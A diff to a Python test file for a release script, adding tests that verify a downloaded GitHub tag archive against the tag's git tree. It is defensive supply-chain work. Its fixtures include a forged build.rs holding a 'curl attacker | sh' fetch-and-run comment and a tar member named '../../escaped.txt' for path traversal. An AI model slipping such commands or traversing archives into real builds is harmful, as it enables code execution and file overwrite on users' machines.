@@ -6,6 +6,7 @@ import hashlib
 import importlib.util
 import io
 import json
+import os
 import re
 import subprocess
 import sys
@@ -749,16 +750,40 @@ def _brew_info(linked_keg):
     return json.dumps({"formulae": [{"linked_keg": linked_keg}]})
 
 
-def _tag_archive(path, commit):
-    """A gzipped tar carrying `commit` the way GitHub's generated archives do."""
+# What GitHub's generated archive looks like: one prefixed directory of
+# ordinary files, plus the commit id in the global pax header. Verified
+# against the real v0.19.1-sudo.28 archive (749 members, one top-level entry
+# `sudo-secretspec-0.19.1-sudo.28`, pax comment c31befc3...).
+_ARCHIVE_FILES = {"README.md": b"readme\n", "src/main.rs": b"fn main() {}\n"}
+
+
+def _tag_archive(path, commit, *, prefix=None, files=None, release=None):
+    """A gzipped tar shaped like GitHub's generated archive for a tag."""
     headers = {"comment": commit} if commit else {}
+    if prefix is None:
+        prefix = "sudo-secretspec-0.0.0" if release is None else release.archive_prefix
+    files = _ARCHIVE_FILES if files is None else files
     with tarfile.open(
         path, "w:gz", format=tarfile.PAX_FORMAT, pax_headers=headers
     ) as tf:
-        member = tarfile.TarInfo("sudo-secretspec/README.md")
-        member.size = 0
-        tf.addfile(member, io.BytesIO(b""))
+        for name, body in files.items():
+            member = tarfile.TarInfo(f"{prefix}/{name}")
+            member.size = len(body)
+            tf.addfile(member, io.BytesIO(body))
     return path
+
+
+def _tree_of(files=None):
+    """The fingerprint `tree_entries` produces for `files`, without extracting."""
+    files = _ARCHIVE_FILES if files is None else files
+    entries = {}
+    for name, body in files.items():
+        entries[name] = ("100644", hashlib.sha256(body).hexdigest())
+        # Intermediate directories are entries too, with no mode or digest of
+        # their own -- `tree_entries` records only files and symlinks, so a
+        # directory never appears. Nothing to add here; this comment is the
+        # reason the dict looks flat.
+    return entries
 
 
 def test_archive_commit_reads_the_commit_github_embeds(release, tmp_path):
@@ -799,6 +824,164 @@ def _fake_archive_download(monkeypatch, release, body: bytes):
     monkeypatch.setattr(release._OPENER, "open", lambda *_a, **_k: _ByteResponse(body))
 
 
+def _stub_tag_tree(monkeypatch, release, files=None):
+    """`tag_tree` shells out to `git archive`; tests supply its answer."""
+    monkeypatch.setattr(release, "tag_tree", lambda _r: _tree_of(files))
+
+
+def test_a_forged_archive_with_the_genuine_commit_id_is_refused(
+    monkeypatch, release, cut, tmp_path
+):
+    """1b: the pax comment is data *inside* the archive, so whoever produces
+    the bytes chooses it. The reviewer proved a 25-line script could build an
+    archive carrying a hostile build.rs and the real commit id, and it passed
+    the commit check unchanged (adversary 1b, 2026-10-20). The tree comparison
+    is what a forgery cannot pass.
+    """
+    commit = "a" * 40
+    monkeypatch.setattr(release, "output", lambda *_a, **_k: commit)
+    _stub_tag_tree(monkeypatch, release)
+
+    forged = dict(_ARCHIVE_FILES)
+    forged["build.rs"] = b"fn main() { /* curl attacker | sh */ }"
+    body = _tag_archive(
+        tmp_path / "forged.tar.gz", commit, release=cut, files=forged
+    ).read_bytes()
+    _fake_archive_download(monkeypatch, release, body)
+
+    # It carries the genuine commit, so the accident check is satisfied.
+    assert release.archive_commit(tmp_path / "forged.tar.gz") == commit
+    with pytest.raises(release.ReleaseError) as caught:
+        release.require_archive_matches_tag(cut, dry_run=False)
+    message = str(caught.value)
+    assert f"is not {cut.tag}'s tree" in message
+    # The message has to name the file, because this failure lands after the
+    # tag is published and the operator is deciding resume-by-hand vs breach.
+    assert "build.rs" in message
+    assert release.RESUME_BY_HAND_HINT in message
+
+
+def test_a_changed_file_and_a_missing_file_are_both_caught(
+    monkeypatch, release, cut, tmp_path
+):
+    """Content and absence, not just extra paths: `git archive` of the tag is
+    the authority on all three."""
+    commit = "a" * 40
+    monkeypatch.setattr(release, "output", lambda *_a, **_k: commit)
+    _stub_tag_tree(monkeypatch, release)
+
+    changed = dict(_ARCHIVE_FILES, **{"src/main.rs": b"fn main() { evil() }\n"})
+    dropped = {"README.md": _ARCHIVE_FILES["README.md"]}
+    for name, files, expected in (
+        ("changed", changed, "1 different (src/main.rs)"),
+        ("dropped", dropped, "1 missing (src/main.rs)"),
+    ):
+        release._ARCHIVE_FACTS.clear()
+        body = _tag_archive(
+            tmp_path / f"{name}.tar.gz", commit, release=cut, files=files
+        ).read_bytes()
+        _fake_archive_download(monkeypatch, release, body)
+        with pytest.raises(release.ReleaseError, match=re.escape(expected)):
+            release.require_archive_matches_tag(cut, dry_run=False)
+
+
+def test_the_archive_must_be_one_prefixed_directory(release, cut, tmp_path):
+    """GitHub puts exactly one `<repo>-<version>/` directory in its archive.
+    The prefix is computed locally, so it is a requirement the bytes meet, not
+    a value they choose."""
+    assert cut.archive_prefix == f"sudo-secretspec-{cut.version}"
+
+    good = _tag_archive(tmp_path / "good.tar.gz", "a" * 40, release=cut)
+    assert release.extracted_tree(good, prefix=cut.archive_prefix) == _tree_of()
+
+    wrong = _tag_archive(tmp_path / "wrong.tar.gz", "a" * 40, prefix="elsewhere-1.0")
+    assert release.extracted_tree(wrong, prefix=cut.archive_prefix) is None
+
+    (tmp_path / "junk.tar.gz").write_bytes(b"not a gzip stream")
+    assert release.extracted_tree(tmp_path / "junk.tar.gz", prefix="x") is None
+
+
+def test_a_traversing_member_is_refused_not_written(release, tmp_path):
+    """This is the one place release.py writes bytes it does not trust to the
+    filesystem, and its premise is that the archive may not be the tag's tree.
+
+    On Python 3.14 the `extractall` default is already `data`, so this test
+    cannot distinguish the explicit `filter="data"` from the default and
+    removing the argument does not fail it. It still pins the behaviour the
+    binding depends on, and the argument is what carries that behaviour to
+    3.13, which `sudo-release.yml` pins and where an unfiltered extractall
+    escapes with only a DeprecationWarning (probed 2026-10-20).
+    """
+    evil = tmp_path / "evil.tar.gz"
+    with tarfile.open(evil, "w:gz") as tf:
+        member = tarfile.TarInfo("../../escaped.txt")
+        payload = b"written outside the destination\n"
+        member.size = len(payload)
+        tf.addfile(member, io.BytesIO(payload))
+
+    before = set(tmp_path.rglob("*"))
+    assert release.extracted_tree(evil, prefix="anything") is None
+    # Nothing new anywhere under tmp_path, and the extraction destination is a
+    # TemporaryDirectory that is gone either way -- so check the tree the test
+    # owns rather than one guessed path two levels up, which is where an
+    # earlier version of this assertion looked and would have passed on a
+    # real escape.
+    assert set(tmp_path.rglob("*")) == before
+
+
+def test_tree_entries_records_what_git_tracks_and_nothing_else(release, tmp_path):
+    """Path, executable bit, symlink target, content -- not mtimes, not
+    uid/gid, not directories. Verified against the real v0.19.1-sudo.28
+    archive, which fingerprints identically to `git archive` of its tag: 601
+    entries on each side, zero differences."""
+    root = tmp_path / "tree"
+    (root / "nested").mkdir(parents=True)
+    (root / "plain.txt").write_bytes(b"plain\n")
+    (root / "nested" / "script.sh").write_bytes(b"#!/bin/sh\n")
+    (root / "nested" / "script.sh").chmod(0o755)
+    (root / "link").symlink_to("plain.txt")
+
+    entries = release.tree_entries(root)
+    assert set(entries) == {"plain.txt", "nested/script.sh", "link"}
+    assert entries["plain.txt"][0] == "100644"
+    assert entries["nested/script.sh"][0] == "100755"
+    # A symlink is its target string, not the content it resolves to --
+    # otherwise a symlink swapped for a copy would compare equal.
+    assert entries["link"] == ("120000", hashlib.sha256(b"plain.txt").hexdigest())
+
+    # mtime is not tracked, so touching a file must not change the answer.
+    os.utime(root / "plain.txt", (0, 0))
+    assert release.tree_entries(root) == entries
+
+
+def test_a_failing_git_archive_is_a_release_error_with_the_resume_path(
+    monkeypatch, release, cut
+):
+    """`run` has check=True, so a bare CalledProcessError out of `tag_tree`
+    would be the one failure on this path reaching the operator without the
+    resume hint."""
+
+    def boom(*_a, **_k):
+        raise subprocess.CalledProcessError(128, ["git", "archive"], stderr="no tag")
+
+    monkeypatch.setattr(release, "run", boom)
+    assert release.tag_tree(cut) is None
+
+
+def test_a_tag_whose_tree_cannot_be_read_fails_closed(
+    monkeypatch, release, cut, tmp_path
+):
+    """If `git archive` cannot produce the tag's tree there is nothing to
+    compare against, so the release must stop rather than skip the binding."""
+    commit = "a" * 40
+    monkeypatch.setattr(release, "output", lambda *_a, **_k: commit)
+    monkeypatch.setattr(release, "tag_tree", lambda _r: None)
+    body = _tag_archive(tmp_path / "ok.tar.gz", commit, release=cut).read_bytes()
+    _fake_archive_download(monkeypatch, release, body)
+    with pytest.raises(release.ReleaseError, match="cannot fingerprint"):
+        release.require_archive_matches_tag(cut, dry_run=False)
+
+
 def test_the_archive_must_be_the_tag_commits_tree(monkeypatch, release, cut, tmp_path):
     """N6c: nothing local used to check the archive bytes against the tag.
 
@@ -807,11 +990,18 @@ def test_the_archive_must_be_the_tag_commits_tree(monkeypatch, release, cut, tmp
     """
     wanted, other = "a" * 40, "b" * 40
     monkeypatch.setattr(release, "output", lambda *_a, **_k: wanted)
+    _stub_tag_tree(monkeypatch, release)
 
     for body, expected in (
-        (_tag_archive(tmp_path / "ok.tar.gz", wanted), None),
-        (_tag_archive(tmp_path / "no.tar.gz", other), "is not the tag's tree"),
-        (_tag_archive(tmp_path / "bare.tar.gz", None), "carries no commit id"),
+        (_tag_archive(tmp_path / "ok.tar.gz", wanted, release=cut), None),
+        (
+            _tag_archive(tmp_path / "no.tar.gz", other, release=cut),
+            "is not this tag's",
+        ),
+        (
+            _tag_archive(tmp_path / "bare.tar.gz", None, release=cut),
+            "carries no commit id",
+        ),
     ):
         # One release per archive: the facts are memoised per URL, which is the
         # whole point of the fix, so a second body needs a fresh memo.
@@ -840,9 +1030,12 @@ def test_every_post_tag_archive_failure_names_the_resume_path(
     assert "cannot resolve" in messages[0]
 
     monkeypatch.setattr(release, "output", lambda *_a, **_k: "a" * 40)
+    _stub_tag_tree(monkeypatch, release)
     for name, commit in (("bare", None), ("other", "b" * 40)):
         release._ARCHIVE_FACTS.clear()
-        body = _tag_archive(tmp_path / f"{name}.tar.gz", commit).read_bytes()
+        body = _tag_archive(
+            tmp_path / f"{name}.tar.gz", commit, release=cut
+        ).read_bytes()
         _fake_archive_download(monkeypatch, release, body)
         messages.append(failure())
 
@@ -959,7 +1152,7 @@ def test_a_truncated_download_is_retried_not_misdiagnosed(
     as the permanent-sounding "not an archive GitHub generated for this tag"
     (adversary, 2026-10-20)."""
     commit = "e" * 40
-    body = _tag_archive(tmp_path / "full.tar.gz", commit).read_bytes()
+    body = _tag_archive(tmp_path / "full.tar.gz", commit, release=cut).read_bytes()
     half = len(body) // 2
     responses = [
         # Claims the full length, delivers half: a cut transfer. `http.client`
@@ -972,10 +1165,13 @@ def test_a_truncated_download_is_retried_not_misdiagnosed(
     monkeypatch.setattr(release._OPENER, "open", lambda *_a, **_k: responses.pop(0))
     monkeypatch.setattr(release.time, "sleep", lambda _s: None)
 
-    digest, found = release.archive_facts(cut, dry_run=False)
+    digest, found, tree = release.archive_facts(cut, dry_run=False)
     assert responses == []  # the short body was retried, not accepted
     assert found == commit
     assert digest == hashlib.sha256(body).hexdigest()
+    # The tree comes off the same bytes, so it is present on the good attempt
+    # and never built from the truncated one.
+    assert tree == _tree_of()
 
 
 def test_an_undeclared_content_length_still_fetches(monkeypatch, release, cut):
@@ -1056,7 +1252,7 @@ def test_the_archive_is_fetched_once_for_both_the_digest_and_the_commit(
     and the first fix added a *third* download for the commit check, so the
     bytes bound to the tag were not the bytes pinned (adversary finding 2)."""
     commit = "d" * 40
-    body = _tag_archive(tmp_path / "once.tar.gz", commit).read_bytes()
+    body = _tag_archive(tmp_path / "once.tar.gz", commit, release=cut).read_bytes()
     downloads = []
 
     def opener(*_a, **_k):
@@ -1065,6 +1261,7 @@ def test_the_archive_is_fetched_once_for_both_the_digest_and_the_commit(
 
     monkeypatch.setattr(release._OPENER, "open", opener)
     monkeypatch.setattr(release, "output", lambda *_a, **_k: commit)
+    _stub_tag_tree(monkeypatch, release)
 
     release.require_archive_matches_tag(cut, dry_run=False)
     first = release.archive_sha256(cut, dry_run=False)
